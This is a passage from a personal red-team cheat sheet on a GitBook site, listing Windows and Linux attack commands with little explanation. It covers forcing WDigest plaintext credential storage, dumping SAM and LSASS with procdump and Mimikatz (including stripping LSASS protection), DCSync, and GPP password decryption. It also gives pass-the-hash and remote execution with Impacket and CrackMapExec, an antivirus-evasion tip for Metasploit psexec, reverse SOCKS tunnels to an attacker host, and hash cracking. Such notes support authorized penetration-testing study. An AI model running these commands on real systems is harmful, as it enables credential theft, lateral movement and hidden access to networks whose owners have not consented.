<p>8. Request TGT for service<br></br>9. Request TGS on behalf of user (Rubeus s4u)<br></br>10. Modify existing TGS for another service (like cifs)<br></br>11. Load TGS</p>
<p>However, this is probably a waste of your time since impacket does this in one command.</p>
<p># WDigest Plaintext Logon Credentials</p>
<p>‚óè        reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 ‚áí force WDigest to store logon credentials in plaintext</p>
<p>‚óè        wait for user to log in</p>
<p>‚óè        sekurlsa::wdigest ‚áí check for plaintext passwords</p>
<p># Group Policy Preferences (GPP)</p>
<p>**Note:** patched in MS14-025</p>
<p>**Locally**</p>
<p>12. C:\Windows\SYSVOL\Preferences\Groups\Groups.xml on domain controller<br></br>13. copy cpassword from cpassword annotation<br></br>14. gpp-decrypt [cpassword]</p>
<p>**Impacket**</p>
<p>impacket-Get-GPPPassword [domain]/[user]:[password]@[DC]</p>
<p>‚óè        -xmlfile [Groups.xml file] local ‚áí parse local xml file</p>
<p>Pivoting</p>
<p>[<a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/" target="_blank">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a>)</p>
<p># Dumping Hashes</p>
<p>## Linux</p>
<p>‚óè        cat /etc/passwd ‚áí users</p>
<p>‚óè        cat /etc/shadow ‚áí password hashes</p>
<p>‚óè        unshadow /etc/passwd /etc/shadow &gt; hashes.txt ‚áí combine for hash cracking</p>
<p>## Windows</p>
<p>[<a href="https://www.thehacker.recipes/ad/movement/credentials/dumping\](https://www.thehacker.recipes/ad/movement/credentials/dumping" target="_blank">https://www.thehacker.recipes/ad/movement/credentials/dumping\](https://www.thehacker.recipes/ad/movement/credentials/dumping</a>)</p>
<p>Hashes are stored in three places:</p>
<p>‚óè        SAM ‚áí local user accounts</p>
<p>‚óè        LSA ‚áí domain user accounts</p>
<p>‚óè        NTDS.dit ‚áí everyone on domain (DC only)</p>
<p>### Locally</p>
<p>reg save HKLM\SAM "C:\Windows\Temp\sam.save"</p>
<p>reg save HKLM\SECURITY "C:\Windows\Temp\security.save"</p>
<p>reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"</p>
<p>Task Manager ‚Üí Right click lsass.exe ‚Üí Create dump file</p>
<p>procdump -accepteula -ma lsass.exe lsass.dmp</p>
<p>Control Panel ‚Üí User Accounts ‚Üí Credential Manager</p>
<p>powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"</p>
<p>### Mimikatz</p>
<p>‚óè        token::elevate</p>
<p>‚óè        privilege::debug</p>
<p>‚óè        lsadump::sam /patch ‚áí SAM hashes</p>
<p>‚óè        lsadump::lsa /patch OR lsadump::lsa /inject ‚áí LSA hashes</p>
<p>‚óè        sekurlsa::msv ‚áí hashes in LSASS memory</p>
<p>‚óè        sekurlsa::logonpasswords ‚áí hashes for users logged in since last reboot</p>
<p>‚óã        if this returns an error:</p>
<p>!+</p>
<p>!processprotect /process:lsass.exe /remove</p>
<p>try again</p>
<p>‚óè        sekurlsa::credman ‚áí hashes in Windows Credential Manager</p>
<p>‚óè        lsadump::dcsync /domain:[domain] /all /csv ‚áí NTDS.dit</p>
<p>‚óã        equivalent of -just-dc in impacket-secretsdump</p>
<p>### Impacket</p>
<p>‚óè        impacket-secretsdump [domain]/[user]:[password]@[host]</p>
<pre><code>            OR
</code></pre><p>‚óè        impacket-secretsdump [domain]/[user]@[host] -hashes [hash]</p>
<p>_Flags:_</p>
<p>‚óè        -just-dc ‚áí only NTDS.dit data (NTLM hashes and Kerberos keys)</p>
<p>‚óè        -just-dc-ntlm ‚áí only NTDS.dit data (NTLM hashes only)</p>
<p>‚óè        -sam [SAM file] -system [SYSTEM file] -security [SECURITY file] local ‚áí dump directly from SAM</p>
<p>‚óè        -ntds [NTDS file] -system [SYSTEM file] -security [SECURITY file] local ‚áí dump directly from NTDS</p>
<p>‚óè        -no-pass ‚áí don‚Äôt prompt for password (used with -k)</p>
<p>‚óè        -k [ccache file] ‚áí use kerberos ticket</p>
<p>### CrackMapExec</p>
<p>crackmapexec smb [host] -u [username] -p [password] [--sam/--lsa/--ntds]</p>
<p># Pass-the-Hash (PTH)</p>
<p>[<a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/" target="_blank">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a>)</p>
<p>**Note:** Hash is in the form [LM hash]:[NT hash] unless otherwise stated. LM hash can also be either empty or 32 zeros in most cases.</p>
<p>### Mimikatz</p>
<p>‚óè        token::revert</p>
<p>‚óè        sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[NT hash] /run:"[command]"</p>
<p>### CrackMapExec</p>
<p>‚óè        crackmapexec [protocol] [host] -d [domain] -u [user] -H [NT hash] -x [command]</p>
<p>‚óã        Can use --local-auth instead of -d</p>
<p>‚óã        -t [threads]</p>
<p>‚óã        --verbose</p>
<p>crackmapexec [protocol] -h for more info</p>
<p>**Protocols:**</p>
<p>‚óè        FTP</p>
<p>‚óè        RDP</p>
<p>‚óè        MSSQL</p>
<p>‚óè        SMB</p>
<p>‚óè        LDAP</p>
<p>‚óè        SSH</p>
<p>‚óè        WinRM</p>
<p>### Impacket</p>
<p>Note: If you have a Kerberos ticket, you can omit -hashes and use -k -no-pass instead. _See_ [_Request New Initial TGT_](<a href="https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.8zkfly6nu0pz" target="_blank">https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.8zkfly6nu0pz</a>) _or_ [_Request Delegated TGT_](<a href="https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.n3l1v6yyohv" target="_blank">https://docs.google.com/document/d/1MVC5l0cuEw2p5pXNvvb1kXyee-IxitJW7X\_eibU\_4B0/edit\#heading=h.n3l1v6yyohv</a>) _above_.</p>
<p>‚óè        Be sure to modify relevant sections of /etc/krb5.conf: domain_realm and realms</p>
<p>impacket-smbclient [domain]/[user]:[password]@[host]</p>
<p>impacket-smbexec [domain]/[user]:[password]@[host]</p>
<p>impacket-psexec [domain]/[user]:[password]@[host]</p>
<p>impacket-atexec [domain]/[user]:[password]@[host]</p>
<p>impacket-wmiexec [domain]/[user]:[password]@[host]</p>
<p>impacket-dcomexec [domain]/[user]:[password]@[host]</p>
<p>impacket-mssqlclient [domain]/[user]:[password]@[host]</p>
<p>impacket-GetADUsers</p>
<p>impacket-getArch</p>
<p>impacket-lookupsid</p>
<p>impacket-machine_role</p>
<p>impacket-netview</p>
<p>impacket-rdp_check</p>
<p>impacket-mqtt_check</p>
<p>impacket-mimikatz</p>
<p>impacket-reg</p>
<p>impacket-services</p>
<p>impacket-rpcdump</p>
<p>impacket-samrdump</p>
<p>impacket-addcomputer</p>
<p>### Metasploit Modules</p>
<p>‚óè        exploit/windows/smb/psexec</p>
<p>‚óã        ‚ÄúUse custom templates or MOF upload method to circumvent AV detection‚Äù</p>
<p>‚óè        auxiliary/admin/smb/psexec_command</p>
<p>‚óè        exploit/windows/local/current_user_psexec</p>
<p>Port Redirection/Tunnelling</p>
<p># SSH</p>
<p>[<a href="https://youtu.be/JKrO5WABdoY\](https://youtu.be/JKrO5WABdoY" target="_blank">https://youtu.be/JKrO5WABdoY\](https://youtu.be/JKrO5WABdoY</a>)</p>
<p>A device has access to a port I want.</p>
<p>ssh [device I‚Äôm connecting to that has what I want ‚Äì user@ip] -p [port to ssh to that device on ‚Äì 22] -L [what port of mine I want it on]:[what I want ‚Äì ip:port]</p>
<p>I have access to a port a device wants.</p>
<p>ssh [device I‚Äôm connecting to that wants what I have ‚Äì user@ip] -p [port to ssh to that device on ‚Äì 22] -R [what port of theirs they want it on]:[what they want ‚Äì ip:port]</p>
<p># ProxyChains</p>
<p>### SSH</p>
<p>From target (SSH server on attacker): ssh -fN -R [port] root@[attacker]</p>
<p>From attacker (SSH server on target): ssh -fN -D [port] [user]@[target]</p>
<p>### Chisel</p>
<p>On attacker: chisel server -p 8000 --socks5 --reverse</p>
<p>On target: chisel client [attacker]:8000 R:socks</p>
<p>edit /etc/proxychains.conf</p>
<p>...</p>
<p>socks5    [host] 1080</p>
<p>proxychains [command to execute on target]</p>
<p>### Ligolo-ng</p>
<p>Prep (on attacker):</p>
<p>ip tuntap add user [user] mode tun ligolo</p>
<p>ip link set ligolo up</p>
<p>ip route add [network] dev ligolo</p>
<p>On attacker (proxy): ligolo -selfcert -laddr 0.0.0.0:8000</p>
<p>On target (agent): ligolo -connect [attacker]:8000 -ignore-cert</p>
<p>session</p>
<p>start</p>
<p>listener_add --addr 0.0.0.0:[target port] --to 127.0.0.1:[kali port] --tcp</p>
<p>Hash Cracking</p>
<p>[CrackStation](<a href="https://crackstation.net" target="_blank">https://crackstation.net</a>)</p>
<p># Wordlist Generation</p>
<p>## Crunch</p>
<p>crunch [minimum num characters] [maximum num characters] [characters] -t [pattern] -b [max filesize] -o [filename] -p (no repeating characters) or -p [word1] [word2]... (mix words no repeat)</p>
<p>‚óè        pattern:</p>
<p>‚óã        @ ‚áí lowercase letters</p>
<p>‚óã        , ‚áí uppercase letters</p>
<p>‚óã        % ‚áí numbers</p>
<p>‚óã        ^ ‚áí special characters</p>
<p>crunch [minimum num characters] [maximum num characters] -f /usr/share/crunch/charset.lst [charset] -t [pattern] -b [max filesize] -o [filename]</p>
<p>‚óè        search charsets using cat /usr/share/crunch/charset.lst</p>
<p>man crunch for more info</p>
<p>‚óè        example: crunch 6 6 0123456789ABCDEF -o crunch1.txt</p>
<p>## Cewl</p>
<p>cewl [base URL] -m [min word length] -d [crawl depth] -w [output file] --with-numbers</p>
<p># Identification</p>
<p>[hash examples](<a href="https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401" target="_blank">https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401</a>)</p>
<p>hash-identifier</p>
<p># HashCat</p>
<p>hashcat -m [type] [hashes] [wordlist]</p>
<p>hashcat -m [type] -a 3 [hashes] [mask (optional)]</p>
<p>‚óè        ?l ‚áí lowercase letters</p>
<p>‚óè        ?u ‚áí uppercase letters</p>
<p>‚óè        ?d ‚áí digits</p>
<p>‚óè        ?s ‚áí special characters</p>
<p>‚óè        ?a ‚áí all of the above</p>
<p>‚óè        ?b ‚áí yucky bytes (null, etc.)</p>
<p>**Windows NTLM:** -m 1000</p>
<p>### Rules</p>
<p>[<a href="https://hashcat.net/wiki/doku.php?id=rule\_based\_attack\](https://hashcat.net/wiki/doku.php?id=rule\_based\_attack" target="_blank">https://hashcat.net/wiki/doku.php?id=rule\_based\_attack\](https://hashcat.net/wiki/doku.php?id=rule\_based\_attack</a>)</p>
<p>/usr/share/hashcat/rules</p>
<p>hashcat -r [file].rule --stdout [wordlist]</p>
<p>hashcat -r [file].rule ‚Ä¶</p>
<p># John</p>
<p>unshadow /etc/passwd /etc/shadow &gt; [hashlist]</p>
<p>john [hashes] --format=[type] --wordlist=[wordlist]</p>
<p>rm /etc/john/john.pot</p>
<p>### Rules</p>
<p>/etc/john/john.conf has all rules</p>
<p>‚óè        add section with [List.Rules:rulename] followed by hashcat style rules</p>
<p>john --rules=[rulename]</p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="tools.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: Tools I Use">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Red Team Cheat Sheet","level":"4.1.1","depth":2,"previous":{"title":"Tools I Use","level":"4.1","depth":1,"path":"resources/tools.md","ref":"resources/tools.md","articles":[{"title":"Red Team Cheat Sheet","level":"4.1.1","depth":2,"path":"resources/redteamcheatsheet.md","ref":"resources/redteamcheatsheet.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"resources/redteamcheatsheet.md","mtime":"2026-02-26T22:45:07.389Z","type":"markdown"},"gitbook":{"version":"6.1.6","time":"2026-02-26T22:45:11.251Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <noscript>
        <style>
            .honkit-cloak {
                display: block !important;
            }
        </style>
    </noscript>
    <script>
        // Restore sidebar state as critical path for prevent layout shift
        function __init__getSidebarState(defaultValue){
            var baseKey = "";
            var key = baseKey + ":sidebar";
            try {
                var value = localStorage[key];
                if (value === undefined) {
                    return defaultValue;
                }
                var parsed = JSON.parse(value);
                return parsed == null ? defaultValue : parsed;
            } catch (e) {
                return defaultValue;
            }
        }
        function __init__restoreLastSidebarState() {
            var isMobile = window.matchMedia("(max-width: 600px)").matches;
            if (isMobile) {
                // Init last state if not mobile
                return;
            }
            var sidebarState = __init__getSidebarState(true);
            var book = document.querySelector(".book");
            // Show sidebar if it enabled
            if (sidebarState && book) {
                book.classList.add("without-animation", "with-summary");
            }
        }

        try {
            __init__restoreLastSidebarState();
        } finally {
            var book = document.querySelector(".book");
            book.classList.remove("honkit-cloak");
        }
    </script>
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/@honkit/honkit-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

